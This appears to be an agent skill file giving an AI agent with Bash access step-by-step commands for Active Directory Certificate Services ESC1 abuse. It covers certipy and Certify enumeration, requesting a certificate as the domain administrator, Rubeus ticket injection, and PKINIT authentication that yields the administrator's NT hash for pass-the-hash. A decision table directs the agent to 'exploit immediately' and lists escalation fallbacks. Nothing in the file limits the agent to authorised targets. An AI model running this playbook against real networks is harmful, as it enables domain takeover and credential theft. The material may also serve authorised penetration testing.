---
name: adcs-esc1
description: "ADCS ESC1 template abuse — enrollee supplies subject + client auth EKU"
allowed-tools: Bash
metadata:
  subdomain: active-directory
  mitre_attack: T1649
  when_to_use: "adcs, esc1, certificate, certipy, template, ENROLLEE_SUPPLIES_SUBJECT"
  tags: active-directory, adcs, certificate, privilege-escalation
---

# ADCS ESC1 — Certificate Template Abuse

ESC1: a certificate template allows the enrollee to specify a Subject Alternative Name (SAN) and has Client Authentication EKU. An attacker requests a certificate as any user — including Domain Admin.

## Prerequisites
- Enrollment rights on the vulnerable template
- Template has `ENROLLEE_SUPPLIES_SUBJECT` flag
- Template includes Client Authentication EKU (`1.3.6.1.5.5.7.3.2`)

## 1. Find Vulnerable Templates

**Certipy (Linux)**
```bash
# Full CA + template enumeration
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -json -stdout > adcs_enum.json

# Vulnerable templates only
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
```

**Certify (Windows — fallback)**
```powershell
Certify.exe find /vulnerable
Certify.exe cas
```

## 2. Audit Results

```python
# Parse certipy JSON and identify ESC1–ESC8 weaknesses
adcs_audit(certipy_json_output)
```

Look for templates where:
- `Enrollee Supplies Subject` = `True`
- `Client Authentication` = `True`
- `Authorized Signatures Required` = `0`
- Your user or group has `Enrollment Rights`

## 3. Exploit — Request Certificate as Domain Admin

**Certipy (Linux)**
```bash
# Request cert with SAN set to administrator
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' -upn 'administrator@<DOMAIN>' -out admin_cert
```

**Certify + Rubeus (Windows)**
```powershell
Certify.exe request /ca:<CA_NAME> /template:<TEMPLATE_NAME> /altname:administrator
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
Rubeus.exe asktgt /user:administrator /certificate:C:\workspace\admin.pfx /ptt
```

## 4. Authenticate with Certificate (PKINIT)

```bash
# Authenticate — returns NT hash of impersonated user
certipy auth -pfx admin_cert.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

The NT hash output can be used directly for pass-the-hash with secretsdump, evil-winrm, or psexec.

## 5. Decision Gates

| Condition | Action |
|-----------|--------|
| `adcs_audit` finds ESC1 template | Exploit immediately — fastest path to DA |
| No enrollment rights on ESC1 template | Check for ESC4 (template ACL write) to modify template |
| Certipy auth fails (PKINIT not enabled) | Use `certipy auth -pfx ... -ldap-shell` for LDAP shell |
| No vulnerable templates found | Check ESC2–ESC8 in audit output; try NTLM relay to CA (ESC8) |

## Anti-Patterns
- Running `certipy find` without `-json` — the JSON output is required for `adcs_audit()`.
- Requesting a certificate without verifying enrollment rights first — the request will fail silently.
- Forgetting to check `Authorized Signatures Required` — if > 0, the CA requires an enrollment agent co-sign.
